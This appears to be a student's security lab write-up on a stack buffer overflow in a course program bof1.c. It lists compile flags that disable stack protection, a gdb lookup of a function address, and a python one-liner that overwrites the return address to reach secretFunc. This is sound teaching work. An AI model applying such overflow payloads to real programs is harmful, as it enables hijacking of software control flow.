# LAB 01
# Name: Lưu Quang Hiếu _ ID: 22110024
*Conduct buffer overflow attack on bof1.c, bof2.c, bof3.c programs.*
## Bof1
- **Step 1**: Build the image "img4lab" for lab

![image](https://github.com/user-attachments/assets/f765a575-3451-462b-991a-92acd36afd5f)


And execute the buffer overflow

![image](https://github.com/user-attachments/assets/336d412a-c59e-4c20-873e-eeb52c39e7f9)

**The Stack Frame for this Lab**


![image](https://github.com/user-attachments/assets/8dacb82b-c728-4620-842f-f38fa5712fcf)

- **Step 2**: Build the program with `gcc -g bof1.c -o bof1.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`

![image](https://github.com/user-attachments/assets/741bfac1-89e1-46a8-8a01-bf3fc671619b)

`-fno-stack-protector` : Use for  Turn off the compiler's stack smashing check option.  
`-mpreferred-stack-boundary=2` : Use for Set boundary euqal 2 to make gdb look more clear.  

- **Step 3:** Run `./bof1.out`  
![image](https://github.com/user-attachments/assets/c10ae9fa-8075-43c2-8c61-45ba6bdf1ebe)
- Run gdb to find the address of secretFunc()

  ![image](https://github.com/user-attachments/assets/c10e18f2-4025-44ea-83be-6a87ee5a4c69)

  
And now we can see the address of secretFunc at the the first line `0x0804846b`

- **Step 4:** Filling full buffer with random char and insert the function address with `(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 1`
  
 ![image](https://github.com/user-attachments/assets/cbf27ecb-23d3-4ec7-bb4f-763870bb38a5)    

 We can see that I filled buffer with 204 char a (I choose 204 because to fill the buffer we need 200 byte and more 4 byte to fill the ebp) and insert address with little-endian type /x6b/x84/x04/x08 And I successful with the line Congratulation!
 
